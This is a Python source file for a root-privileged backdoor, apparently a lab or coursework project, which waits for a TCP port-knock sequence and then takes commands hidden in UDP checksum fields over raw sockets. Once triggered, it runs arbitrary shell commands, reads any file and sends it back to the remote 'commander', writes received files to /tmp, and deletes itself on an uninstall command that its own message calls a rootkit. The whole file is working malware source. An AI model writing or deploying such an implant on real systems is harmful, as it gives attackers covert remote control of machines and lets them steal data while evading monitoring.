#!/usr/bin/env python3
"""
Client Program - Integrated Port Knock + Raw Socket Covert Channel
Listens for TCP port knocks, then accepts commands via UDP raw socket covert channel.

REQUIRES: Root/Administrator privileges for raw sockets
Usage: sudo python3 client.py
"""
import os
import socket
import struct
import time
import sys
import subprocess
from enum import IntEnum
from collections import deque
import threading

# Configuration
KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
KNOCK_TIMEOUT = 10  # Seconds to complete knock
COMMAND_PORT = 8888  # UDP port for covert channel (after knocking)


class CommandType(IntEnum):
    """Commands encoded in UDP checksum field"""
    DISCONNECT = 0x1234
    UNINSTALL = 0x2345
    TRANSFER_TO_CLIENT = 0x3456
    TRANSFER_FROM_CLIENT = 0x4567
    RUN_COMMAND = 0x5678
    ACK = 0x9ABC
    ERROR = 0xABCD


class RawSocketProtocol:
    """Raw socket protocol for covert communication"""

    def __init__(self):
        self.sequence = 0

    def calculate_checksum(self, data):
        """Calculate checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'

        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word

        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16

        return ~checksum & 0xFFFF

    def create_ip_header(self, src_ip, dst_ip, total_length):
        """Create IP header"""
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = total_length
        ip_id = self.sequence & 0xFFFF
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)

        ip_ihl_version = (ip_version << 4) + ip_ihl

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_version, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto,
                                ip_check, ip_saddr, ip_daddr)

        ip_check = self.calculate_checksum(ip_header)

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_version, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto,
                                ip_check, ip_saddr, ip_daddr)

        return ip_header

    def create_udp_packet(self, src_ip, dst_ip, src_port, dst_port,
                          payload, command_type):
        """Create UDP packet with command in checksum"""
        udp_length = 8 + len(payload)
        udp_checksum = int(command_type)  # COVERT CHANNEL

        udp_header = struct.pack('!HHHH',
                                 src_port, dst_port,
                                 udp_length, udp_checksum)

        total_length = 20 + len(udp_header) + len(payload)
        ip_header = self.create_ip_header(src_ip, dst_ip, total_length)

        packet = ip_header + udp_header + payload
        return packet

    def send_packet(self, src_ip, dst_ip, src_port, dst_port,
                    command_type, payload=b''):
        """Send covert packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            self.sequence += 1
            actual_src_port = self.sequence & 0xFFFF

            packet = self.create_udp_packet(
                src_ip, dst_ip,
                actual_src_port, dst_port,
                payload, command_type
            )

            sock.sendto(packet, (dst_ip, 0))
            sock.close()
            return True

        except PermissionError:
            print("[!] Raw sockets require root privileges")
            return False
        except Exception as e:
            print(f"[!] Error sending: {e}")
            return False

    def parse_udp_packet(self, packet):
        """Parse UDP packet and extract covert data"""
        if len(packet) < 20:
            return None

        ip_header = packet[:20]
        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

        version_ihl = iph[0]
        ihl = version_ihl & 0xF
        iph_length = ihl * 4

        protocol = iph[6]
        src_ip = socket.inet_ntoa(iph[8])
        dst_ip = socket.inet_ntoa(iph[9])

        if protocol != 17:  # Not UDP
            return None

        udp_header = packet[iph_length:iph_length + 8]
        if len(udp_header) < 8:
            return None

        udph = struct.unpack('!HHHH', udp_header)
        src_port = udph[0]
        dst_port = udph[1]
        udp_length = udph[2]
        udp_checksum = udph[3]  # COVERT DATA HERE!

        payload = packet[iph_length + 8:]

        return {
            'src_ip': src_ip,
            'dst_ip': dst_ip,
            'src_port': src_port,
            'dst_port': dst_port,
            'checksum': udp_checksum,
            'payload': payload
        }


class Client:
    """
    Client that:
    1. Listens for TCP port knocks
    2. After successful knock, accepts commands via UDP raw socket covert channel
    """

    def __init__(self):
        self.knock_ports = KNOCK_SEQUENCE
        self.command_port = COMMAND_PORT
        self.knock_sequence = KNOCK_SEQUENCE
        self.knock_timeout = KNOCK_TIMEOUT
        self.knock_attempts = {}
        self.authorized_ips = set()
        self.lock = threading.Lock()
        self.running = True
        self.protocol = RawSocketProtocol()

    def record_knock(self, ip_address, port):
        """Record knock attempt and check sequence"""
        current_time = time.time()

        with self.lock:
            if ip_address not in self.knock_attempts:
                self.knock_attempts[ip_address] = {
                    'knocks': deque(),
                    'last_knock': current_time
                }

            knock_data = self.knock_attempts[ip_address]

            if current_time - knock_data['last_knock'] > self.knock_timeout:
                knock_data['knocks'].clear()

            knock_data['knocks'].append(port)
            knock_data['last_knock'] = current_time

            while len(knock_data['knocks']) > len(self.knock_sequence):
                knock_data['knocks'].popleft()

            if list(knock_data['knocks']) == self.knock_sequence:
                print(f"\n{'=' * 60}")
                print(f"[+] VALID KNOCK SEQUENCE from {ip_address}")
                print(f"[+] Authorizing for covert channel communication")
                print(f"{'=' * 60}\n")
                knock_data['knocks'].clear()
                self.authorized_ips.add(ip_address)
                return True

        return False

    def is_authorized(self, ip_address):
        """Check if IP is authorized"""
        with self.lock:
            return ip_address in self.authorized_ips

    def revoke_authorization(self, ip_address):
        """Remove authorization"""
        with self.lock:
            if ip_address in self.authorized_ips:
                self.authorized_ips.remove(ip_address)
                print(f"[*] Revoked authorization for {ip_address}")

    def listen_for_knocks(self, port):
        """Listen for TCP port knocks"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)

        try:
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            print(f"[*] Knock listener on TCP port {port}")

            while self.running:
                try:
                    conn, addr = sock.accept()
                    ip_address = addr[0]
                    print(f"[+] Knock on port {port} from {ip_address}")
                    self.record_knock(ip_address, port)
                    conn.close()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] Error on knock port {port}: {e}")
        except Exception as e:
            print(f"[!] Failed to bind to port {port}: {e}")
        finally:
            sock.close()

    def listen_for_covert_commands(self):
        """Listen for covert channel commands via raw UDP socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', self.command_port))

            print(f"[*] Covert channel listener on UDP port {self.command_port}")
            print(f"[*] Commands will be extracted from UDP checksum field")
            print()

            while self.running:
                try:
                    packet, addr = sock.recvfrom(65535)

                    parsed = self.protocol.parse_udp_packet(packet)
                    if not parsed:
                        continue

                    if parsed['dst_port'] != self.command_port:
                        continue

                    src_ip = parsed['src_ip']

                    # CHECK AUTHORIZATION from port knocking
                    if not self.is_authorized(src_ip):
                        print(f"[!] Unauthorized covert command from {src_ip} (no valid knock)")
                        continue

                    # Extract command from checksum field
                    command_code = parsed['checksum']

                    try:
                        command_type = CommandType(command_code)
                    except ValueError:
                        print(f"[!] Unknown command: 0x{command_code:04X}")
                        continue

                    print(f"\n[+] Covert command from {src_ip} (AUTHORIZED)")
                    print(f"    Sequence: {parsed['src_port']}")
                    print(f"    Command: {command_type.name} (0x{command_code:04X})")
                    print(f"    Payload: {parsed['payload'][:50]}")

                    # Process command
                    self.process_command(command_type, parsed['payload'], src_ip)

                    # Disconnect revokes authorization
                    if command_type == CommandType.DISCONNECT:
                        self.revoke_authorization(src_ip)

                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
                    continue

            sock.close()

        except PermissionError:
            print("[!] Raw sockets require root privileges")
            print("[!] Run with: sudo python3 client.py")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Fatal error: {e}")
            sys.exit(1)

    def process_command(self, command_type, payload, src_ip):
        """Process received command"""

        if command_type == CommandType.DISCONNECT:
            print("[*] Processing DISCONNECT")
            print(f"    Closing session with {src_ip}")

        elif command_type == CommandType.UNINSTALL:
            print("[*] Processing UNINSTALL")
            print("    Initiating uninstall sequence...")
            os.remove(sys.argv[0])
            self.send_response(src_ip, CommandType.ACK, "Rootkit uninstalled from client\n")

        elif command_type == CommandType.TRANSFER_TO_CLIENT:
            print("[*] Processing TRANSFER_TO_CLIENT")
            # Payload format: filename|filedata
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                if '|' in payload_str:
                    filename, filedata = payload_str.split('|', 1)
                    print(f"    Receiving file: {filename}")
                    print(f"    Size: {len(filedata)} bytes")
                    # Write file to /tmp
                    filepath = f"/tmp/{filename}"
                    with open(filepath, 'w') as f:
                        f.write(filedata)
                    print(f"    File saved to: {filepath}")
                else:
                    print("    Error: Invalid payload format")
            except Exception as e:
                print(f"    Error: {e}")

        elif command_type == CommandType.TRANSFER_FROM_CLIENT:
            filepath = payload.decode('utf-8', errors='ignore')
            print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                print(f"    File size: {len(content)} bytes")
                # Send file back to commander
                self.send_response(src_ip, CommandType.ACK, content)
            except Exception as e:
                print(f"    Error: {e}")
                error_msg = str(e).encode('utf-8')
                self.send_response(src_ip, CommandType.ERROR, error_msg)

        elif command_type == CommandType.RUN_COMMAND:
            cmd = payload.decode('utf-8', errors='ignore')
            print(f"[*] Processing RUN_COMMAND: {cmd}")
            try:
                result = subprocess.run(
                    cmd, shell=True,
                    capture_output=True, text=True,
                    timeout=30
                )
                # Send stdout back to commander
                output = result.stdout if result.stdout else ""
                print(f"    Sending output ({len(output)} bytes) to commander")
                self.send_response(src_ip, CommandType.ACK, output.encode('utf-8'))
            except Exception as e:
                print(f"    Error: {e}")
                error_msg = str(e).encode('utf-8')
                self.send_response(src_ip, CommandType.ERROR, error_msg)

    def send_response(self, dst_ip, command_type, payload):
        """Send response back to commander via covert channel"""
        try:
            # Use the raw socket protocol to send response
            self.protocol.send_packet(
                self.get_local_ip(),
                dst_ip,
                0,  # Source port (sequence)
                self.command_port,
                command_type,
                payload
            )
            print(f"    Response sent to {dst_ip}")
        except Exception as e:
            print(f"    Failed to send response: {e}")

    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"

    def start(self):
        """Start the client"""
        print("=" * 60)
        print("Client - Port Knock + Raw Socket Covert Channel")
        print("=" * 60)
        print(f"Knock sequence: {self.knock_sequence}")
        print(f"Knock timeout: {self.knock_timeout}s")
        print(f"Command port: UDP {self.command_port}")
        print("=" * 60)
        print()

        # Start knock listeners
        for port in self.knock_ports:
            thread = threading.Thread(target=self.listen_for_knocks, args=(port,))
            thread.daemon = True
            thread.start()

        # Start covert channel listener (main thread)
        try:
            self.listen_for_covert_commands()
        except KeyboardInterrupt:
            print("\n[*] Shutting down client...")
            self.running = False


def main():
    print("Client Program")
    print("Requires root/admin privileges for raw sockets")
    print()

    client = Client()
    client.start()


if __name__ == "__main__":
    main()